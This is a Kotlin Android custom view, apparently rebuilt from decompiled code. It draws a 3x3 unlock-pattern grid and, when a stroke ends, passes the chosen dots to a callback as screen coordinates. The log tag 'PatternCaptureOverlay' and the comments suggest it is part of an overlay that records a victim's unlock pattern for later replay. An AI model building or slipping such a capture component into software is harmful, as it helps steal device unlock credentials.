package com.storm.safe.rock.service.modules.cipher

import android.animation.ValueAnimator
import android.content.Context
import android.graphics.BlendMode
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.Path
import android.graphics.PointF
import android.os.Build
import android.util.Log
import android.view.MotionEvent
import android.view.View
import android.view.animation.AnimationUtils
import android.view.animation.Interpolator
import kotlin.math.abs
import kotlin.math.max
import kotlin.math.min
import kotlin.math.sqrt

/**
 * 图案锁自定义 View — 捕获用户绘制的解锁图案。
 *
 * JADX: C0336a2.java (818 行)
 * 方法映射:
 *   a0 → addDot              (添加选中点)
 *   a1 → clearPattern        (清除所有点)
 *   a2 → detectDot           (碰撞检测)
 *   a3 → getCenterX          (列中心 X)
 *   a4 → getCenterY          (行中心 Y)
 *   a5 → setupPaints         (初始化画笔)
 *   a6 → animateDot          (点动画)
 *   onDraw, onMeasure, onSizeChanged, onTouchEvent, dispatchTouchEvent
 */
@Suppress("MemberVisibilityCanBePrivate")
class PatternLockView(context: Context) : View(context) {

    companion object {
        private const val TAG = "PatternCaptureOverlay"
    }

    // ==================== 属性 ====================

    /** 点阵大小 (默认 3x3) */
    var dotCount: Int = 3
        set(value) {
            field = value
            dotStates = Array(value) { Array(value) { DotState().apply { size = dotNormalSize } } }
            selected = Array(value) { Array(value) { false } }
            requestLayout()
        }

    /** 点状态矩阵 */
    private var dotStates: Array<Array<DotState>> = Array(dotCount) { Array(dotCount) { DotState() } }

    /** 选中状态矩阵 */
    private var selected: Array<Array<Boolean>> = Array(dotCount) { Array(dotCount) { false } }

    /** 选中的点序列 (row, col) */
    private val selectedDots: ArrayList<Pair<Int, Int>> = ArrayList()

    /** 未选中点颜色 */
    var normalStateColor: Int = -1

    /** 选中点颜色 */
    var dotSelectedColor: Int = -1

    /** 正确状态颜色 */
    var correctStateColor: Int = -1
        set(value) {
            field = value
            Color.parseColor("#f4511e") // vendor 忽略返回值
        }

    /** 错误状态颜色 (vendor 空实现) */
    var wrongStateColor: Int = -1

    /** 路径颜色 */
    var pathColor: Int = -1
        set(value) {
            field = value
            setupPaints()
            invalidate()
        }

    /** 点正常大小 */
    var dotNormalSize: Int = 10

    /** 点选中大小 */
    var dotSelectedSize: Int = 24

    /** 路径宽度 */
    var pathWidth: Int = 3
        set(value) {
            field = value
            setupPaints()
            invalidate()
        }

    /** 长宽比模式: 0=正方形, 1=限制高度, 2=限制宽度 */
    var aspectRatio: Int = 1

    /** 是否启用长宽比 */
    var aspectRatioEnabled: Boolean = false

    /** 外圈透明度 */
    var outerCircleAlpha: Float = 1.0f
        set(value) { field = value.coerceIn(0f, 1f) }

    /** 点动画时长 */
    var dotAnimationDuration: Int = 190

    /** 路径结束动画时长 */
    var pathEndAnimationDuration: Int = 100

    /** 是否启用输入 */
    var inputEnabled: Boolean = true

    /** 是否正在绘制 */
    private var isDrawing: Boolean = false

    /** 是否隐身模式（不显示路径） */
    var inStealthMode: Boolean = false

    /** 是否启用触觉反馈 */
    var hapticEnabled: Boolean = true

    /** 当前触摸 X */
    private var currentX: Float = -1f

    /** 当前触摸 Y */
    private var currentY: Float = -1f

    /** 单元格宽度 */
    private var cellW: Float = 0f

    /** 单元格高度 */
    private var cellH: Float = 0f

    /** 内点大小 */
    var innerDotSize: Int = 0

    /** 插值器 */
    private var fastOutSlowIn: Interpolator? = null
    private var linearOutSlowIn: Interpolator? = null

    /** 画笔 */
    private val pathPaint: Path = Path()
    private val dotPaint: Paint = Paint(Paint.ANTI_ALIAS_FLAG)
    private val linePaint: Paint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
        style = Paint.Style.STROKE
        strokeJoin = Paint.Join.ROUND
        strokeCap = Paint.Cap.ROUND
    }

    /** 图案完成回调 */
    var onPatternComplete: ((List<PointF>) -> Unit)? = null

    /** 调试日志计数 */
    private var logCount: Int = 0

    init {
        isClickable = true
        // 初始化点状态
        for (r in 0 until dotCount) {
            for (c in 0 until dotCount) {
                dotStates[r][c] = DotState().apply { size = dotNormalSize }
            }
        }
        setupPaints()
        try {
            fastOutSlowIn = AnimationUtils.loadInterpolator(context, android.R.interpolator.fast_out_slow_in)
            linearOutSlowIn = AnimationUtils.loadInterpolator(context, android.R.interpolator.linear_out_slow_in)
        } catch (_: Exception) {}
    }

    // ==================== 公共方法 ====================

    /**
     * 设置点对齐方式 (仅触发重绘)。
     * vendor: setDotAlign
     */
    fun setDotAlign(align: DotAlign) {
        invalidate()
    }

    /**
     * 获取已选图案的平面索引列表。
     * vendor: getSelectedPattern
     */
    fun getSelectedPattern(): List<Int> {
        return selectedDots.map { (row, col) -> row * dotCount + col }
    }

    // ==================== 内部方法 ====================

    /**
     * 添加选中的点。
     * vendor: a0
     */
    private fun addDot(pair: Pair<Int, Int>) {
        val (row, col) = pair
        selected[row][col] = true
        selectedDots.add(pair)

        if (!inStealthMode) {
            val dot = dotStates[row][col]
            animateDot(dot, dotNormalSize.toFloat(), dotSelectedSize.toFloat(),
                dotAnimationDuration.toLong(), linearOutSlowIn) {
                animateDot(dot, dotSelectedSize.toFloat(), dotNormalSize.toFloat(),
                    dotAnimationDuration.toLong(), fastOutSlowIn, null)
            }

            val prevX = currentX
            val prevY = currentY
            val targetX = getCenterX(col)
            val targetY = getCenterY(row)

            val animator = ValueAnimator.ofFloat(0f, 1f)
            animator.addUpdateListener { anim ->
                val fraction = anim.animatedValue as Float
                dot.animX = targetX + (prevX - targetX) * (1 - fraction) - (prevX - targetX) * (1 - fraction) + prevX * (1 - fraction) + targetX * fraction
                // vendor: AbstractC0003a2.m19a0(targetX, prevX, fraction, prevX) — linear interpolation
                dot.animX = prevX + (targetX - prevX) * fraction
                dot.animY = prevY + (targetY - prevY) * fraction
                invalidate()
            }
            fastOutSlowIn?.let { animator.interpolator = it }
            animator.duration = pathEndAnimationDuration.toLong()
            animator.start()
            dot.animator = animator
        }
        announceForAccessibility("Dot added to pattern")
    }

    /**
     * 清除所有选中状态。
     * vendor: a1
     */
    private fun clearPattern() {
        for (r in 0 until dotCount) {
            for (c in 0 until dotCount) {
                selected[r][c] = false
                val dot = dotStates[r][c]
                dot.size = dotNormalSize
                dot.isAnimating = false
                dot.animX = Float.MIN_VALUE
                dot.animY = Float.MIN_VALUE
                dot.animator?.cancel()
                dot.animator = null
            }
        }
    }

    /**
     * 碰撞检测 — 判断触摸点落在哪个网格点。
     * vendor: a2
     */
    private fun detectDot(x: Float, y: Float): Pair<Int, Int>? {
        val hitH = cellH * 0.6f
        val rowPad = (cellH - hitH) / 2f + paddingTop

        // 查找行
        var hitRow = -1
        for (r in 0 until dotCount) {
            val rowStart = r * cellH + rowPad
            if (y >= rowStart && y <= rowStart + hitH) {
                hitRow = r
                break
            }
        }

        if (logCount < 20) {
            logCount++
            Log.d(TAG, "★ detectDot(${"%.1f".format(x)},${"%.1f".format(y)}): cellW=${"%.1f".format(cellW)}, cellH=${"%.1f".format(cellH)}, hitRow=$hitRow")
        }

        if (hitRow < 0) return null

        // 查找列
        val hitW = cellW * 0.6f
        val colPad = (cellW - hitW) / 2f + paddingLeft
        var hitCol = -1
        for (c in 0 until dotCount) {
            val colStart = c * cellW + colPad
            if (x >= colStart && x <= colStart + hitW) {
                hitCol = c
                break
            }
        }

        if (hitCol < 0 || selected[hitRow][hitCol]) return null

        // 检查是否需要自动插入中间点（对角线跳过）
        if (selectedDots.isNotEmpty()) {
            val (lastRow, lastCol) = selectedDots.last()
            val dRow = hitRow - lastRow
            val dCol = hitCol - lastCol
            val midRow = if (abs(dRow) == 2 && abs(dCol) != 1) {
                lastRow + (if (dRow > 0) 1 else -1)
            } else lastRow
            val midCol = if (abs(dCol) == 2 && abs(dRow) != 1) {
                lastCol + (if (dCol > 0) 1 else -1)
            } else lastCol

            if ((midRow != lastRow || midCol != lastCol) && !selected[midRow][midCol]) {
                addDot(Pair(midRow, midCol))
            }
        }

        addDot(Pair(hitRow, hitCol))
        if (hapticEnabled) {
            performHapticFeedback(1, 3)
        }
        return Pair(hitRow, hitCol)
    }

    /**
     * 获取列中心 X 坐标。
     * vendor: a3
     */
    fun getCenterX(col: Int): Float {
        return paddingLeft + col * cellW + cellW / 2f
    }

    /**
     * 获取行中心 Y 坐标。
     * vendor: a4
     */
    fun getCenterY(row: Int): Float {
        return paddingTop + row * cellH + cellH / 2f
    }

    /**
     * 初始化画笔。
     * vendor: a5
     */
    private fun setupPaints() {
        linePaint.apply {
            isAntiAlias = true
            isDither = true
            color = pathColor
            style = Paint.Style.STROKE
            strokeJoin = Paint.Join.ROUND
            strokeCap = Paint.Cap.ROUND
            strokeWidth = pathWidth.toFloat()
        }
        if (Build.VERSION.SDK_INT >= 29) {
            linePaint.blendMode = BlendMode.OVERLAY
        }
        dotPaint.apply {
            isAntiAlias = true
            isDither = true
        }
    }

    /**
     * 执行点大小动画。
     * vendor: a6
     */
    private fun animateDot(
        dot: DotState,
        from: Float,
        to: Float,
        duration: Long,
        interpolator: Interpolator?,
        onEnd: (() -> Unit)? = null
    ) {
        val animator = ValueAnimator.ofFloat(from, to)
        animator.addUpdateListener { anim ->
            dot.size = (anim.animatedValue as Float).toInt()
            invalidate()
        }
        if (onEnd != null) {
            animator.addListener(object : android.animation.AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: android.animation.Animator) {
                    onEnd()
                }
            })
        }
        interpolator?.let { animator.interpolator = it }
        animator.duration = duration
        animator.start()
    }

    // ==================== View 重写 ====================

    override fun dispatchTouchEvent(event: MotionEvent): Boolean {
        Log.d(TAG, "★ dispatchTouchEvent: action=${event.action}, x=${event.x}, y=${event.y}" +
            ", viewW=$width, viewH=$height, cellW=$cellW, cellH=$cellH" +
            ", enabled=$isEnabled, inputEn=$inputEnabled")
        return super.dispatchTouchEvent(event)
    }

    override fun onDraw(canvas: Canvas) {
        super.onDraw(canvas)
        val path = pathPaint
        path.rewind()

        val hasInnerDot = innerDotSize > 0 && outerCircleAlpha < 1.0f

        // 绘制所有点
        for (r in 0 until dotCount) {
            val cy = getCenterY(r)
            for (c in 0 until dotCount) {
                val dot = dotStates[r][c]
                val cx = getCenterX(c)
                val radius = dot.size / 2f
                val color = if (!selected[r][c] || inStealthMode || isDrawing) {
                    if (dot.isAnimating) dotSelectedColor else normalStateColor
                } else correctStateColor

                if (hasInnerDot) {
                    dotPaint.color = color
                    val alpha = Color.alpha(color)
                    dotPaint.alpha = (alpha * outerCircleAlpha).toInt().coerceIn(0, 255)
                    canvas.drawCircle(cx, cy, radius, dotPaint)
                    dotPaint.color = color
                    dotPaint.alpha = alpha
                    canvas.drawCircle(cx, cy, innerDotSize / 2f, dotPaint)
                } else {
                    dotPaint.color = color
                    dotPaint.alpha = 255
                    canvas.drawCircle(cx, cy, radius, dotPaint)
                }
            }
        }

        if (inStealthMode || selectedDots.isEmpty()) return

        // 绘制连接路径
        linePaint.color = pathColor
        linePaint.alpha = 255
        var prevX = 0f
        var prevY = 0f
        var started = false

        for (i in selectedDots.indices) {
            val (row, col) = selectedDots[i]
            if (!selected[row][col]) break
            val cx = getCenterX(col)
            val cy = getCenterY(row)

            if (i != 0) {
                val dot = dotStates[row][col]
                path.rewind()
                path.moveTo(prevX, prevY)
                if (dot.animX != Float.MIN_VALUE && dot.animY != Float.MIN_VALUE) {
                    path.lineTo(dot.animX, dot.animY)
                    canvas.drawPath(path, linePaint)
                } else {
                    path.lineTo(cx, cy)
                    canvas.drawPath(path, linePaint)
                }
            }
            prevX = cx
            prevY = cy
            started = true
        }

        // 绘制到当前触摸点的路径
        if (isDrawing && started) {
            path.rewind()
            path.moveTo(prevX, prevY)
            path.lineTo(currentX, currentY)
            val dx = currentX - prevX
            val dy = currentY - prevY
            val dist = sqrt(dx * dx + dy * dy)
            val alpha = (min(1f, max(0f, (dist / cellW - 0.3f) * 4f)) * 255f).toInt()
            linePaint.alpha = alpha
            canvas.drawPath(path, linePaint)
        }
    }

    override fun onMeasure(widthMeasureSpec: Int, heightMeasureSpec: Int) {
        super.onMeasure(widthMeasureSpec, heightMeasureSpec)
        if (!aspectRatioEnabled) return

        var w = when (MeasureSpec.getMode(widthMeasureSpec)) {
            MeasureSpec.AT_MOST -> max(MeasureSpec.getSize(widthMeasureSpec), suggestedMinimumWidth)
            MeasureSpec.EXACTLY -> MeasureSpec.getSize(widthMeasureSpec)
            else -> suggestedMinimumWidth
        }
        var h = when (MeasureSpec.getMode(heightMeasureSpec)) {
            MeasureSpec.AT_MOST -> max(MeasureSpec.getSize(heightMeasureSpec), suggestedMinimumHeight)
            MeasureSpec.EXACTLY -> MeasureSpec.getSize(heightMeasureSpec)
            else -> suggestedMinimumHeight
        }

        when (aspectRatio) {
            0 -> { val min = min(w, h); w = min; h = min }
            1 -> h = min(w, h)
            2 -> w = min(w, h)
        }
        setMeasuredDimension(w, h)
    }

    override fun onSizeChanged(w: Int, h: Int, oldw: Int, oldh: Int) {
        cellW = (w - paddingLeft - paddingRight).toFloat() / dotCount
        cellH = (h - paddingTop - paddingBottom).toFloat() / dotCount
        Log.d(TAG, "★ onSizeChanged: w=$w, h=$h, cellWidth=$cellW, cellHeight=$cellH" +
            ", paddingL=$paddingLeft, paddingT=$paddingTop, dotCount=$dotCount")
    }

    override fun onTouchEvent(event: MotionEvent): Boolean {
        if (!inputEnabled || !isEnabled) {
            Log.w(TAG, "★ onTouchEvent 被拦截: inputEnabled=$inputEnabled, isEnabled=$isEnabled")
            return false
        }

        when (event.action) {
            MotionEvent.ACTION_DOWN -> {
                Log.d(TAG, "★ ACTION_DOWN: x=${event.x}, y=${event.y}")
                logCount = 0
                selectedDots.clear()
                clearPattern()
                invalidate()
                val dot = detectDot(event.x, event.y)
                isDrawing = dot != null
                if (dot != null) {
                    Log.d(TAG, "★ ACTION_DOWN: 命中点 $dot, isDrawing=true")
                }
                currentX = event.x
                currentY = event.y
                return true
            }

            MotionEvent.ACTION_MOVE -> {
                val historySize = event.historySize
                for (i in 0 until historySize + 1) {
                    val x = if (i < historySize) event.getHistoricalX(i) else event.x
                    val y = if (i < historySize) event.getHistoricalY(i) else event.y
                    val hit = detectDot(x, y)
                    if (hit != null && selectedDots.size == 1) {
                        isDrawing = true
                        announceForAccessibility("Pattern started")
                    }
                }
                currentX = event.x
                currentY = event.y
                invalidate()
                return true
            }

            MotionEvent.ACTION_UP -> {
                if (selectedDots.isNotEmpty()) {
                    isDrawing = false
                    // 取消所有动画
                    for (r in 0 until dotCount) {
                        for (c in 0 until dotCount) {
                            val dot = dotStates[r][c]
                            dot.animator?.cancel()
                            dot.animX = Float.MIN_VALUE
                            dot.animY = Float.MIN_VALUE
                        }
                    }
                    announceForAccessibility("Pattern drawing completed")

                    // 收集屏幕坐标
                    val screenPoints = ArrayList<PointF>()
                    val location = IntArray(2)
                    getLocationOnScreen(location)
                    for ((row, col) in selectedDots) {
                        screenPoints.add(PointF(
                            getCenterX(col) + location[0],
                            getCenterY(row) + location[1]
                        ))
                    }

                    Log.d(TAG, "ACTION_UP: selectedDots=${selectedDots.size}, screenPoints=${screenPoints.size}, location=[${location[0]},${location[1]}]")

                    if (screenPoints.isNotEmpty()) {
                        onPatternComplete?.invoke(screenPoints)
                    }
                    invalidate()
                }
                return true
            }

            MotionEvent.ACTION_CANCEL -> {
                isDrawing = false
                selectedDots.clear()
                clearPattern()
                invalidate()
                return true
            }
        }
        return false
    }
}
